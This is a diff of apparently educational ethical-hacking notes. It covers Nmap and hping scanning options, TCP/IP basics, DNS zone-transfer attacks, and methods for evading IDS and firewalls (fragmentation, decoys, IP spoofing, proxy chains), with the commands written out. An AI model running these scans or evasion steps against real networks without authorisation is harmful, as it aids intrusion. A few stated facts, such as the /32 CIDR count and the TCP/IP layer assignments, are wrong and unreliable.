+  - TCP: `-PS`, ([SYN](./scanning-techniques.md#syn-scanning)), `-PA` ([ACK](./scanning-techniques.md#ack-scanning))
+  - Others: `-PR` ([ARP](./scanning-techniques.md#arp-scan)), `-PO` (IP protocol ping), `-PE` [ICMP](./scanning-techniques.md#icmp-ping-sweep) `PU` ([UDP](./scanning-techniques.md#udp-scanning))
+  - **`-Pn` (no ping)**
+    - Also known as ***pingless scan*** or ***port scan***
+    - Skips host discovery and treats all hosts as online
+
+#### Specifying ports
+
+- `-p-` to scan all ports (`1-65535`)
+- `-p`: only scan specified ports
+  - E.g. `-p U:53,111,137,T:21-25,80,139,8080`
+- `-r`: Scan ports consecutively - don't randomize
+
+#### `-O`: OS fingerprinting
+
+- `-O` is used for operating system fingerprinting
+- It's Far more effective if at least one open and one closed TCP port are found.
+  - Flag with `--osscan-limit` and Nmap will not try OS detection against hosts that do not meet this criteria.
+- `--fuzzy` or `--osscan-guess` switch: Nmap will guess more aggressively
+- ❗Requires `sudo` privileges
+- See also [banner grabbing](./banner-grabbing.md)
+
+#### `-o*`: output options
+
+- `-oX` for XML output.
+- `-oG` for `grep`able output to be able to use linux [`grep` command](../06-system-hacking/linux-basics.md) to search in text
+- ❗ Not to be confused with `-O` (OS fingerprinting)
+
+#### Faster scans
+
+- `-T*`: Timing template
+  - From slowest to fastest: `-T0` (paranoid), `-T1` (sneaky), `-T2` (polite), `-T3` (normal | default), `-T4` (aggressive) or `-T5` (insane)
+- `-F`: Fast (limited port) scan
+  - Nmap as default most common 1000 ports, `-F` reduces it to 100
+- ❗ If the scan is too fast the system can drop the packets
+  - Risky because the system can cancel the whole scan when it detects for the first time.
+
+#### Target specification
+
+- `nmap <target>`
+- Everything that isn't an option (or option argument) is treated as a target host specification
+- Target can be IP address(es) or hostname(s) (resolved via DNS)
+- Target can be specify single or multiple hosts:
+  - Scanning single host:
+    - E.g. `nmap 192.168.10.0` (IP address) or `nmap localhost` (hostname)
+  - Scanning many hosts:
+    - CIDR style addressing
+      - E.g. `192.168.10.0/24` would scan the 256 hosts
+    - Octet range addressing (more flexible)
+      - E.g. `192.168.0-255.1-254`
+      - Full octet scan: `192.168.0.*`
+    - Using target list: `nmap -iL targets`
+    - Scan multiple addresses using `nmap <target-1>, <target-2> ...`
+      - E.g. `nmap privacy.sexy cloudarchitecture.io`
+
+## Hping
+
+- [Open-source](http://www.hping.org/) port scanner
+- Sends custom ICMP, UDP, or TCP packets and then displays any replies
+
+### Hping vs Nmap
+
+- `nmap` can scan a range of IP addresses
+  - `hping` can only port scan one individual IP address
+- `hping` is more lower level and stealthier than `nmap`
+- `hping` does not support IPv6 while `nmap` does.
+
+### Common hping commands
+
+- `--tcp-timestamp`
+  - Enables TCP timestamps
+  - Tries to guess the timestamp update frequency and the remote system uptime.
+  - ❗ Many firewalls drop packets without timestamp.
+- `-Q` or `--seqnum`
+  - Collects sequence numbers generated by target host
+  - Useful when you need to analyze whether TCP sequence number is predictable.
+- Setting flags using
+  - `-F` (`FIN`), `-S` (`SYN`), `-R` (`RST`), `-P` (`PUSH`), `-A` (`ACK`), `-U` (`URG`)
+- Scanning entire subnet: `hping3 -1 10.0.1.x`
+- Listen to traffic (e.g. to sniff): `hping3 -9 HTTP -I eth0`
+- See also its [man page](https://linux.die.net/man/8/hping3)
+
+## Mobile tools
+
+- [IP Scanner](https://10base-t.com) for IOS
+- [Fing](https://www.fing.io) for IOS and Android
 # Scanning techniques
 
 - Used to
@@ -3446,481 +3380,268 @@
 - Keeping as few ports open as necessary and filtering the rest
 - Checking the configuration of the network and its ports
 - Ensuring the proper configuration of anti- scanning and spoofing rulesets
-# Scanning tools
-
-## Nmap
-
-- Scans network by sending specially crafted packets
-- Allows finding hosts on network with service, OS and firewall information
-- Allows custom scripts written in LUA using **NSE (Nmap Scripting Engine)**
-  - 💡 Can be used to detect and/or exploit vulnerabilities
-  - E.g. can [detect shellshock using nmap scripting engine](./../05-vulnerabilities/common-vulnerabilities.md#detecting-shellshock-using-nmap)
-- Includes
-  - [Ncat](https://Nmap.org/ncat/): reads and writes data across networks from the command
-  - [`ndiff`](https://Nmap.org/ndiff/): compares scan results
-  - [`nping`](https://Nmap.org/nping/): generates packets and analyzes responses
-- 🤗 Used often in movies including Matrix Reloaded, see [the list](https://nmap.org/movies/)
-- See also [Nmap | Network footprinting](./../02-footprinting/network-footprinting.md#nmap) and [Nmap | Vulnerability analysis](./../05-vulnerabilities/vulnerability-analysis.md#nmap).
-
-### [Phases of an Nmap scan](https://Nmap.org/book/Nmap-phases.html)
-
-1. **Script pre-scanning**: Runs NSE scripts that are run once per execution for each targets, e.g. `dhcp-discover`.
-2. **Target enumeration**: Resolves DNS names, CIDR network notations etc. to list of IPv4 or IPv6 addresses
-3. **Host discovery (ping scanning)**: Checking if a host (or which hosts are) is alive before deeper investigation
-4. **Reverse-DNS resolution**: Provides IP numbers for hosts that are alive
-5. **Port scanning**: Probes are sent and remote port states are classified as `open`, `closed`, `filtered`
-6. **Version detection**: Determines what server software is running on remote system
-7. **OS detection**: Determines OS that's running on the port
-8. **Traceroute**: Usually involves another round of reverse-DNS resolution for intermediate hosts.
-9. **Script scanning**: Runs most of the scripts rather than pre-scan and post-scan phases.
-10. **Output**: Prints results using different options e.g. XML
-11. **Script post-scanning**: Runs scripts that process results and deliver final reports and statistics
-
-### Common Nmap options
-
-- 📝 All options are important for a security tester to be able to use Nmap.
-- `-n` (no resolution): Skips DNS resolution and scanning for DNS addresses
-- `-A`: Enable • OS detection • version detection • script scanning • traceroute
-- `--traceroute`: Enables trace routing
-- `--script` or `-SC`: Activates custom script scanning
-
-#### `-s*`: port scan options
-
-- Uses [ICMP echo request](./scanning-techniques.md#scanning-icmp), [TCP SYN](./scanning-techniques.md#syn-scanning) to port 443, [TCP ACK to port 80](./scanning-techniques.md#ack-scanning), and an ICMP timestamp request.
-- `-sn`
-  - Also known as ***ping scan*** or ***host discovery***
-  - Skips port scanning
-- Common commands include:
-  - TCP port scanning: `-sS` ([SYN](./scanning-techniques.md#syn-scanning)), `-sT` ([connect](./scanning-techniques.md#tcp-connect)), `-sN` ([NULL](./scanning-techniques.md#null-scan)), `-sF` ([FIN](./scanning-techniques.md#fin-scan)), `-sX` ([XMAS](./scanning-techniques.md#xmas-scan))
-  - UDP port scanning: `-sU` ([UDP](./scanning-techniques.md#udp-scanning))
-  - `-sV`: service/version detection scan
-  - `-sO`
-    - IP protocol scan
-    - Not really a port scan
-    - Lists supported IP protocols (TCP, ICMP, IGMP etc.) by target system.
-
-#### `-P*`: ping (host discovery) options
-
-- `-P*` options are used to select different ping methods
-- User with `-sn` to skip port scanning and do host discovery only.
-- Common commands include:
-  - TCP: `-PS`, ([SYN](./scanning-techniques.md#syn-scanning)), `-PA` ([ACK](./scanning-techniques.md#ack-scanning))
-  - Others: `-PR` ([ARP](./scanning-techniques.md#arp-scan)), `-PO` (IP protocol ping), `-PE` [ICMP](./scanning-techniques.md#icmp-ping-sweep) `PU` ([UDP](./scanning-techniques.md#udp-scanning))
-  - **`-Pn` (no ping)**
-    - Also known as ***pingless scan*** or ***port scan***
-    - Skips host discovery and treats all hosts as online
-
-#### Specifying ports
-
-- `-p-` to scan all ports (`1-65535`)
-- `-p`: only scan specified ports
-  - E.g. `-p U:53,111,137,T:21-25,80,139,8080`
-- `-r`: Scan ports consecutively - don't randomize
-
-#### `-O`: OS fingerprinting
-
-- `-O` is used for operating system fingerprinting
-- It's Far more effective if at least one open and one closed TCP port are found.
-  - Flag with `--osscan-limit` and Nmap will not try OS detection against hosts that do not meet this criteria.
-- `--fuzzy` or `--osscan-guess` switch: Nmap will guess more aggressively
-- ❗Requires `sudo` privileges
-- See also [banner grabbing](./banner-grabbing.md)
-
-#### `-o*`: output options
-
-- `-oX` for XML output.
-- `-oG` for `grep`able output to be able to use linux [`grep` command](../06-system-hacking/linux-basics.md) to search in text
-- ❗ Not to be confused with `-O` (OS fingerprinting)
-
-#### Faster scans
-
-- `-T*`: Timing template
-  - From slowest to fastest: `-T0` (paranoid), `-T1` (sneaky), `-T2` (polite), `-T3` (normal | default), `-T4` (aggressive) or `-T5` (insane)
-- `-F`: Fast (limited port) scan
-  - Nmap as default most common 1000 ports, `-F` reduces it to 100
-- ❗ If the scan is too fast the system can drop the packets
-  - Risky because the system can cancel the whole scan when it detects for the first time.
-
-#### Target specification
-
-- `nmap <target>`
-- Everything that isn't an option (or option argument) is treated as a target host specification
-- Target can be IP address(es) or hostname(s) (resolved via DNS)
-- Target can be specify single or multiple hosts:
-  - Scanning single host:
-    - E.g. `nmap 192.168.10.0` (IP address) or `nmap localhost` (hostname)
-  - Scanning many hosts:
-    - CIDR style addressing
-      - E.g. `192.168.10.0/24` would scan the 256 hosts
-    - Octet range addressing (more flexible)
-      - E.g. `192.168.0-255.1-254`
-      - Full octet scan: `192.168.0.*`
-    - Using target list: `nmap -iL targets`
-    - Scan multiple addresses using `nmap <target-1>, <target-2> ...`
-      - E.g. `nmap privacy.sexy cloudarchitecture.io`
-
-## Hping
-
-- [Open-source](http://www.hping.org/) port scanner
-- Sends custom ICMP, UDP, or TCP packets and then displays any replies
-
-### Hping vs Nmap
-
-- `nmap` can scan a range of IP addresses
-  - `hping` can only port scan one individual IP address
-- `hping` is more lower level and stealthier than `nmap`
-- `hping` does not support IPv6 while `nmap` does.
-
-### Common hping commands
-
-- `--tcp-timestamp`
-  - Enables TCP timestamps
-  - Tries to guess the timestamp update frequency and the remote system uptime.
-  - ❗ Many firewalls drop packets without timestamp.
-- `-Q` or `--seqnum`
-  - Collects sequence numbers generated by target host
-  - Useful when you need to analyze whether TCP sequence number is predictable.
-- Setting flags using
-  - `-F` (`FIN`), `-S` (`SYN`), `-R` (`RST`), `-P` (`PUSH`), `-A` (`ACK`), `-U` (`URG`)
-- Scanning entire subnet: `hping3 -1 10.0.1.x`
-- Listen to traffic (e.g. to sniff): `hping3 -9 HTTP -I eth0`
-- See also its [man page](https://linux.die.net/man/8/hping3)
-
-## Mobile tools
-
-- [IP Scanner](https://10base-t.com) for IOS
-- [Fing](https://www.fing.io) for IOS and Android
-# TCP/IP
-
-## TCP connection
-
-### Three-way handshake
-
-- Also known as • **3-way handshake** • **three-way handshake** • **3 way handshake** • **three way handshake**
-- Establishes a TCP connection
-- 📝 Sender: `SYN` → Receiver: `SYN ACK` → Sender: `ACK`
-  - ![Three Way Handshake (TCP)](img/three-way-handshake-tcp.png)
-- `ACK` is then set in every packet sent after the handshake
-
-### Termination
-
-- 📝 Sender: `FIN` → Receiver: `ACK FIN` → Sender: `ACK`
-
-## IPv4
-
-- IPv4 loopback address (localhost of your own machine) is `127.0.0.1`
-
-### IPv4 address types
-
-1. **Unicast**
-   - Acted on by a single recipient
-2. **Multicast**
-   - Acted on only by members of a specific group
-3. **Broadcast**
-   - Acted on by everyone in the network
-   - Two types:
-     - **Limited broadcast**
-       - Delivered to every system inside a domain using:
-         - IP: 255.255.255.255
-         - MAC: FF:FF:FF:FF:FF:FF
-       - Ignored by routers
-     - **Directed broadcasts**
-       - Sent to all devices on subnet
-       - Use subnets broadcast address
-         - E.g. if subnet is 192.168.17.0/24 then it uses 192.168.17.255
-       - Routers may take action on the packets.
-
-## IPv6
-
-- IPv6 uses a 128-bit address instead of the 32-bit IPv4 version
-- Represented as eight groups of four hexadecimal digits separated by colons
-  - E.g. `2001:0db8:85a3:0000:0000:8a2e:0370:7334`
-- Leading zeros can be removed e.g.
-  - Original: `2001:0001:0002:0003:0004:0005:0006:0007`
-  - Short: `2001:1:2:3:4:5:6:7`
-- The loopback address is `::1`
-  - Shortened version of `0000:0000:0000:0000:0000:0000:0000:0001`
-
-## CIDR
-
-- Method of the representing IP addresses
-- 📝 Easy way to find out CIDR ranges, remember: `/24 255.255.255.0 256`
-  - So `/24` gives 256 IP addresses, `/25` gives 128, `/26` gives 64 and so on.
-- IPv4 Notation
-
-  | CIDR Range | Total IP Addresses | Subnet mask |
-  | ---------- | ------------------ | ----------- |
-  | `/32` | 0 | `255.255` |
-  | `/30` | 4 | `.225.252` |
-  | `/28` | 16 | `.255.240` |
-  | `/26` | 64 | `.255.192` |
-  | `/24` | 256 | `.255.0` |
-  | `/22` | 1024 | `.248.0` |
-  | `/20` | 4096 | `.240.0` |
-
-## TCP flags
-
-- Used to indicate a particular connection state or provide additional information
-- Size of each flag is 1 bit being either `0` or `1`
-- 📝 Flag types
-  - **Synchronization (`SYN`)**
-    - Also known as **synchronization** flag.
-    - Synchronize sequence numbers
-    - First step of connection establishment (3-way handshake)
-    - ❗ Only the first packet sent from each end should have this flag set
-  - **Acknowledgement (`ACK`)**
-    - Confirms successful packet retrieval
-  - **Push (`PSH`)**
-    - Tells receiver to process packets instead of buffering them
-  - **Urgent (`URG`)**
-    - Process packets directly before others, even if they're not complete
-  - **Finish (`FIN`)**:
-    - `1` indicate connection termination requests
-    - Used in the last packet sent from the sender.
-  - **Reset (`RST`)**
-    - `1` aborts the connection in response
-    - Sent from the receiver to the sender when a packet is sent to a particular host that was not expecting it.
-    - Also used as
-      - DDoS attack, see [`RST` attack](./../13-web-applications/denial-of-service.md#rst-attack)
-      - Scanning technique, see [RFC 793 scans](./scanning-techniques.md#rfc-793-scans)
-
-### Finish (`FIN`) vs Reset (`RST`)
-
-| `FIN` | `RST` |
-| ----- | ----- |
-| Gracefully termination | Sudden termination |
-| Only one side of conversation is stopped | Whole conversation is stopped |
-| No data loss | Data is discarded |
-| Receiver of `FIN` can choose to continue communicating | Receiver has to stop communication |
-
-### Push (`PSH`) vs Urgent (`URG`)
-
-| `PSH` | `URG` |
-| ----- | ----- |
-| All data in buffer are pushed | Only urgent data is pushed immediately |
-| Data is delivered in sequence | Data is delivered out of sequence |
-
-## TCP/IP sessions
-
-- TCP uses stateful sessions
-- Connection establishment must be done before data transfer
-- **Session initiation**
-  1. Source sends SYN packet
-  2. Destination responds with SYN/ACK packet
-  3. Source sends ACK packet
-  - Connection stays open until closed with `FIN` or `RST` packets.
-- Session termination
-
-## OSI model
-
-- Conceptual model that characterizes and standardizes the communication functions
-- 📝 Uses seven abstraction layers:
-  1. **Physical** (bits)
-     - Media, signal & binary transmission
-     - E.g. • Cables (fiber) • Fiber • Wireless • Hubs • Repeaters
-  2. **Data link** (frames)
-     - Physical addressing: MAC & LLC
-     - E.g. • Ethernet • [PPP](./../15-cryptography/tunneling-protocols.md#ppp-point-to-point-protocol) • Switch • Bridge
-  3. **Network** (packets)
-     - Path determination & IP
-     - E.g. • IP • [ICMP](./scanning-techniques.md#scanning-icmp) • [IPSec](./../15-cryptography/tunneling-protocols.md#ipsec) • IGMP
-  4. **Transport** (segments)
-     - End-to-end connections and reliability
-     - E.g. • TCP • UDP
-  5. **Session** (data)
-     - Sync & send to ports, inter-host communication
-     - E.g. • API's • Sockets • WinSock
-  6. **Presentation** (data)
-     - Syntax layer
-     - Encrypts/decrypts if needed
-     - E.g. • [SSL/TLS](./../15-cryptography/encrypting-communication.md#ssltls) (not entirely) • [SSH](./../15-cryptography/tunneling-protocols.md#ssh-secure-shell)  • IMAP • [FTP](./../15-cryptography/encrypting-communication.md#ftp-file-transfer-protocol) • MPEG • JPEG
-  7. **Application** (data)
-     - End User Layer: network process to application
-     - E.g. • HTTP • [FTP](./../15-cryptography/encrypting-communication.md#ftp-file-transfer-protocol) • IRC • [SSH](./../15-cryptography/tunneling-protocols.md#ssh-secure-shell) • [DNS](./../04-enumeration/dns-enumeration.md#dns) • [SMTP](./../04-enumeration/enumeration-overview.md#smtp)
-- See also • [Firewall types per OSI Layer | Firewall](./../11-firewalls-ids-and-honeypots/firewall-overview.md#firewall-types-per-osi-layer) • [Vulnerability stack | Hacking web applications](./../13-web-applications/hacking-web-applications.md#vulnerability-stack) • [Encryption types per OSI layer | Encryption algorithms](./../15-cryptography/encryption-algorithms.md#encryption-types-per-osi-layer)
-
-## TCP/IP model
-
-- TCP/IP model defines four levels:
-  1. **Link layer**: • [ARP](./../08-sniffing/arp-poisoning.md#arp) • [PPP](./../15-cryptography/tunneling-protocols.md#ppp-point-to-point-protocol) • [MAC](./../08-sniffing/sniffing-attacks-overview.md#mac)
-  2. **Internet layer**: • TCP • UDP • DCCP • SCTP ...
-  3. **Transport layer**: • IP • ICMP • ECN • [IPSec](./../15-cryptography/tunneling-protocols.md#ipsec) ...
-  4. **Application layer**: • [DNS](./../04-enumeration/dns-enumeration.md#dns) • HTTP • HTTPS • [FTP](./../15-cryptography/encrypting-communication.md#ftp-file-transfer-protocol) • [SSH](./../15-cryptography/tunneling-protocols.md#ssh-secure-shell)) • SMTP ...
-- ❗ OSI model does not match well TCP/IP
-  - [RFC 3439](https://tools.ietf.org/html/rfc3439) considers layering "harmful"
-- ❗ E.g. SSL/TLS does not fit in any of OSI or TCP/IP layers
-  - In OSI it's in layer 6 or 7, and, at the same time, in layer 4 or below.
-  - In TCP/IP it's in between the transport and the application layers.
-
-## TCP/IP vs OSI model
-
-| TCP/IP | Protocols and services | OSI model |
-| ------ |:----------------------:| --------- |
-| Application | • HTTP • [FTP](./../15-cryptography/encrypting-communication.md#ftp-file-transfer-protocol) • Telnet • [NTP](./../04-enumeration/enumeration-overview.md#ntp) • DHCP • PING | • Application • Presentation • Session |
-| Transport | • TCP • UDP | Transport |
-| Network | • IP • [ARP](./../08-sniffing/arp-poisoning.md#arp) • [ICMP](./scanning-techniques.md#scanning-icmp) • IGMP | Network |
-| Network interface | • Ethernet • PPTP | • Data Link • Physical |
-# DNS enumeration
-
-## DNS
-
-- Stands for "Domain Name System"
-- Hierarchical and decentralized naming system
-- Used for resources connected to the Internet including computers and services
-- Runs on TCP/UDP port 53
-
-### DNS records
-
-- Database record used to map a URL to an IP address
-- Stored in zone files in DNS servers
-  - A DNS server contains a "zone file" for each domain
-  - Zone file is made up of "resource records" (RRs)
-- Helps users connect their websites to the outside world.
-- 📝 Common DNS records include
-  - **`A`**
-    - Points a domain to an IPv4 address, such as `11.22.33.44`.
-  - **`AAAA`**
-    - Points a domain to an IPv6 address, such as `FE80::0202:B3FF:FE1E:8329`.
-  - **`MX`**
-    - Mail eXchange records are used to direct emails sent to domain
-    - See also [MX records | Whois, GeoIpLocation and DNS interrogation](./../02-footprinting/whois-geoiplocation-and-dns-interrogation.md#mx-records)
-  - **`NS`**
-    - Used to delegate a domain or subdomain to a set of name servers
-  - **`SOA`**
-    - Contains data to control the zone transfer.
-    - Includes serial number, timestamps, mail address of zone responsible..
-    - E.g.
-
-      ```txt
-
-        $TTL 86400
-        @   IN  SOA     ns.icann.org. noc.dns.icann.org. (
-                2020080302  ;Serial
-                7200        ;Refresh
-                3600        ;Retry
-                1209600     ;Expire
-                3600        ;Minimum TTL
-        )
-
-      ```
-
-  - **`CNAME`**
-    - Link a subdomain to a domain's existing A or AAAA record
-    - E.g. `www.cloudarchitecture.io` to `cloudarchitecture.io`
-  - **`PTR`**
-    - Opposite of `A`, points an IP to domain
-    - Commonly used for spam verification for e-mail programs
-  - **`HINFO`**
-    - System information including CPU and OS type.
-
-## DNS enumeration techniques
-
-- Check all NS Records for [zone transfers](#zone-transfers).
-- Enumerate general [DNS records](#dns-records) for a given domain.
-- Perform common SRV Record Enumeration.
-  - Service records contain the hostname, port and priority of servers for a given service.
-  - Enumerates e.g. • LDAP • Autodiscover for Exchange • Kerberos...
-  - E.g. by `nmap --script dns-srv-enum --script-args "dns-srv-enum.domain='google.com'"`
-- Brute force subdomain and host A and AAAA records discovery with given top domain and wordlist.
-- DNS PTR lookup given a IP range CIDR range
-  - Querying dns for PTR record of each IP in subnet
-- See also [DNS interrogation](./../02-footprinting/whois-geoiplocation-and-dns-interrogation.md#dns-interrogation)
-
-### DNS cache snooping
-
-- Checks a DNS server cached records.
-   Done by performing **non-recursive** (or also known as **iterative**) DNS queries
-  - Also known as iterative query
-  - Server returns either its own record or another DNS server that may know the answer.
-  - As opposed to [recursive DNS lookup](../12-web-servers/web-server-threats-and-attacks.md#recursive-dns-lookup) where servers communicates with other DNS servers.
-- **Tools**
-  - Automated: [dnsrecon](#dnsrecon)
-  - 📝 Manual:
-    - `dig` with `+norecurse` flag
-    - `nslookup` with `-norecurse` flag
-    - `host` with `-r` flag
-
-## Zone transfers
-
-- DNS server passes a copy of part of it's database ("zone") to another DNS server
-- There's one master DNS server, and one or more slave DNS servers
-  - Slaves ask master for a copy of records
-- Uses TCP port 53
-- 📝 Uses **AXFR** (full) protocol or **IXFR** (incremental).
-- The secondary server request a new copy if the primary SOA serial number is higher.
-  - The primary increments the serial number every time the SOA changes
-  - If the secondary checks in and the primary’s copy has a higher serial number
-
-### DNS zone transfer attack
-
-- Pretending to be a slave and ask for records
-- Allows an attacker to obtain sensitive information about internal DNS records (network).
-- 📝 Flow
-  1. Get NS records (DNS servers that are responsible for resolving the queries)
-     - Using `dig`: `dig ns zonetransfer.me` or `dig +short ns zonetransfer.me`
-     - Using `nslookup`: `nslookup zonetransfer.me`
-  2. Initiate AXFR request to get a copy of the zone from name server
-     - Using `dig`: `dig axfr @<DNS you are querying> <target>`
-       - E.g. `dig axfr @nsztm1.digi.ninja zonetransfer.me`
-     - Using `nslookup`
-       - `nslookup -ls -d nsztm1.digi.ninja`
-         - `-d`: list all records for DNS domain
-         - Sends AXFR query to the remote nameserver
-         - Initiates zone transfer if and only if the remote nameserver is dumb enough to respond to unsolicited, unauthorized AXFRs originating from random machines on the Internet.
-       - Or using interactive mode with specified a DNS server:
-
-       ```txt
-         $ nslookup
-         > server <DNS you are querying>
-         > set type=any
-         > ls -d <target>
-       ```
-
-     - Or `nslookup -query=AXFR <target> <DNS you are querying>`
-     - Using `host`: `host -l nsztm1.digi.ninja`
-- 🤗 In June 2017 the registrar responsible for Russian top-level-domains accidentally enabled DNS zone transfers via AXFR which led to 5.6 million records being accidentally exposed | [source](https://securitytrails.com/blog/russian-tlds)
-
-### Zone transfers countermeasures
-
-- Do not allow or restrict zone transfers
-- Use [split DNS](#split-dns)
-
-#### Split DNS
-
-- Also known as ***split-horizon DNS***, ***split-view DNS***, ***split-brain DNS*** or ***split DNS***
-- 📝 Separation of internal network (intranet) DNS and public network (Internet) DNS
-- Provides different answers to DNS queries based on the source address of the DNS request.
-- Can be accomplished with hardware or software solutions
-
-## DNS enumeration tools
-
-### dnsrecon
-
-- [Open source](https://github.com/darkoperator/dnsrecon) python script
-- E.g. `./dnsrecon.py -d cloudarchitecture.io`
-- Enumerates DNS records and more
-
-### nslookup
-
-- Limited: Depends on existence of DNS reverse lookup zone.
-- Forward lookup (normal): Here's name give me IP
-- Reverse lookup: Here's IP give me back the name
-
-### dig
-
-- *Nix tool for querying DNS
-- E.g. `dig cloudarchitecture.io any`
-  - `any` argument (optional): all records it can find
-- `dig axfr cloudarchitecture.io`
-
-### `host`
-
-- On Unix-like operating systems, the `host` command is a DNS lookup utility
-- Using e.g. `host <target-domain>` to see all records.
-- 📝 You can also set type `-t` to see specific records e.g.
-  - `host -t a <target-domain>` to see A records
-  - `host -t ns <target-domain>` to see NS records
-  - ...
+# Bypassing IDS and firewall
+
+- Read more on [Intrusion Detection System Detection | Nmap](https://Nmap.org/book/subvert-ids.html#avoid-ids)
+- See also • [Evading IDS](../11-firewalls-ids-and-honeypots/evading-ids.md) and [Evading Firewalls](../11-firewalls-ids-and-honeypots/evading-firewalls.md)
+
+## Packet fragmentation
+
+- Also known as ***IP fragment scanning*** or ***IP fragmentation***
+- 📝 Splitting up TCP header to several smaller (fragmented) packets when sending
+- Server then reassembles them once all packets are received.
+- Usually ignored by IDSes as processing them requires a lot of computer resources
+- Any IP datagram can be fragmented: including UDP, TCP, ICMP, etc.
+- See also [session splicing](./../11-firewalls-ids-and-honeypots/evading-ids.md#session-splicing) for HTTP header variant.
+- Tools
+  - [Nmap](https://Nmap.org/book/man-bypass-firewalls-ids.html):  `-f` flag e.g. `nmap -f <ip-or-host>`
+    - splits the packets into 8 bytes or less after the IP header
+    - Alternatively can use `--mtu` option allows to set bytes e.g. `--mtu 16`
+  - [`fragroute`](https://tools.kali.org/information-gathering/fragroute)
+    - Usage: `fragroute <domain-name>`
+    - Intercept, modify, and rewrite egress traffic to use fragments
+
+## Source routing
+
+- Also called ***path addressing***
+- Specifying which path the malformed packet will take to get to the target host.
+- Used to skip routes (routers/gateways) where firewalls exist
+  - Disregards what route tables say
+- ❗ Almost always blocked
+- Done by modifying IP address field in IP Options field
+  - ![IP datagram](img/ip-datagram.png)
+- Using Nmap:
+  - **Loose routing**
+    - Specifying packet to be loose source routed through given IP way points
+    - E.g. `--ip-options "L 192.168.0.7 192.168.30.9"`
+  - **Strict routing**
+    - You will have to specify every single hop along the path.
+    - E.g.  `--ip-options "S 192.168.0.7 192.168.0.9 .. 192.168.30.9"`
+- See also [IP address spoofing through source routing | Session hijacking](../13-web-applications/session-hijacking.md#ip-address-spoofing-using-source-routing).
+
+## IP address decoy
+
+- Also known as ***decoy scan***
+- All packets originate from the scanning machine, but some have spoofed source addresses.
+- **Pros**: Helps to confuse port scan detection
+- **Cons**
+  - Does not offer any information beyond a regular scan.
+  - Slows down the scanning process
+- Using Nmap:
+  - `nmap -D decoy1,decoy2,ME,decoy3... <target>`: Manual list with custom positioned `ME`
+  - or `nmap -D RND:10 <target>` to randomize 10 decoy IP addresses
+
+## IP address spoofing
+
+- Used to make packet appear to come from someone else
+- Done by changing address information in IP packet header field
+- Replies go back to the spoofed address not to the attacker
+- Mostly used for DoS attacks
+- Tools:
+  - hping: `hping3 <target> -a <spoofed-ip>`
+  - Nmap: `nmap <target> -S <spoofed-ip>`
+
+### IP address spoofing detection techniques
+
+- **Direct TTL probes**
+  - Ping to suspect IP
+  - If `TTL` in reply is not same as suspect packet, it may be spoofed
+- **IP Identification Number**
+  - Ping to suspect IP
+  - `IPID` should be close to but higher than suspect packet
+  - OS increases IP incrementally for each packet sent
+- **TCP Flow Control Method**
+  - **Sliding window protocol**
+    - In TCP, for each packet `ACK` is expected back before sending another packet.
+    - *Window* packets are allowed to be sent without having to wait for an ACK.
+    - Allows packets to arrive out of order
+    - Window size field in TCP header
+      - Tells maximum amount of data sender can transmit without waiting for `ACK`
+      - **Windows update packet** is used to negotiate a different window size.
+  - Attacker that uses spoof IPs do not receive window size information
+  - If victims receives data packets beyond the window size, they are spoofed packets
+
+### IP address spoofing countermeasures
+
+- Use encryption
+  - Best prevention against IP spoofing attacks
+- Avoid trust relationships
+  - Also known as **no trust architecture**
+  - Do not rely on IP-based authentication
+  - Test all packets, even when they come from one of your trusted hosts
+  - E.g. through password authentication, OAuth etc.
+- Use firewalls and filtering mechanisms
+- Use random initial sequence numbers (ISN)
+  - As `SYN` is `ISN+1` it allows malicious connections.
+  - E.g. if it's based on timed counter it's predictable
+- Ingress filtering
+  - Blocking incoming traffic based [access control lists (ACLs)](./../11-firewalls-ids-and-honeypots/firewall-overview.md#access-control-lists-acls)
+  - Good against blocking unauthorized access
+- Egress filtering against insider attacks
+  - Blocking outcoming traffic
+  - Good against insider attacks where e.g. malware can send information
+- [SYN flooding countermeasures](./../13-web-applications/denial-of-service.md#syn-flood-countermeasures)
+
+## Encryption
+
+- 📝 Encryption over e.g. SSL/TLS or SSH is a good evasion as it "cripples" payload inspection.
+- One way to be able to inspect is through **MITM attacks**
+  1. The server-side encryption is terminated at the inspecting firewall
+  2. The firewall re-encrypts the client-side connection and passes data in between.
+- Other solution is to use **Network Traffic Analysis (NTA)**
+  - It focuses more on unencrypted metadata rather than encrypted payload.
+  - It uses behavioral analysis to sort through network traffic and identify dangerous or suspicious traffic based on what the traffic/host does on the network.
+
+## Proxy servers
+
+- Acts as an intermediary for requests from clients and servers
+- `client <--> proxy <--> server`
+- You can use [free public proxies](http://freeproxylists.net/) for educational purposes
+  - ❗ Careful with public proxies as they can be malicious e.g. inject stuff into your traffic.
+  - 💡 Have your own proxies set-up, see [steps for creating a proxy server](./../11-firewalls-ids-and-honeypots/honeypot.md#setting-up-a-proxy-server-as-honeypot)
+
+### Usage by defenders
+
+- As a firewall to protect internal network
+- As a IP address multiplexer hiding IP addresses of internal servers.
+- Anonymize web surfing to some extend e.g. with VPN services or [Tor](https://www.torproject.org/)
+  - Mobile tools include [Shadowsocks](https://shadowsocks.org/en/index.html) (cross-platform sock5 proxy), [proxydroid](https://github.com/madeye/proxydroid) (http / sock4 / sock5 on Android)
+- Filtering unwanted content such as ads
+- Save bandwidth on local networks
+
+### Usage by attackers
+
+- To conceal the real source of the scan.
+- To remotely access intranets/corporate resources using victim as proxy
+- To do man-in-the-middle attacks by redirecting user traffic to the proxy
+- To sniff user data
+- Tools include
+  - [Parox proxy](https://tools.kali.org/13-web-applications/paros) (outdated), or updated fork of it: [OWASP ZAP](https://www.zaproxy.org/)
+
+#### Proxy chaining
+
+- Helps to increase anonymity by using two or more proxies in chain:
+  - like `your_host <--> proxy1 <--> proxy2 <--> target_host`
+
+##### ProxyChains
+
+- 📝 [Open source](https://github.com/rofl0r/proxychains-ng) unix tool to setup a proxy.
+- Download a file using e.g. `proxychains4 wget <fileurl>`
+- Configure through its configuration file `vim /etc/proxychains.conf`
+  - E.g.
+
+    ```txt
+      sock4 127.0.0.1 9050
+      http 159.65.133.175 3128
+      http 50.198.134.65 80
+    ```
+
+### Anonymizer
+
+- Proxy server that acts as an intermediary and privacy shield between a client computer and Internet provider
+- Use-cases include
+  - Bypassing internet censors
+  - Ensuring privacy
+  - Having protection against online attacks
+  - Bypassing IDS and firewall rules (of e.g. companies or schools)
+
+#### Types of anonymizers
+
+- Networked anonymizers
+  - Information is transferred through network of computers
+  - **Pros**: Harder to analyze traffic
+  - **Cons**: Nodes in the sequence can be compromised
+- Single-point anonymizers
+  - Information is transferred through single website
+  - **Pros**: Protects IP and related information
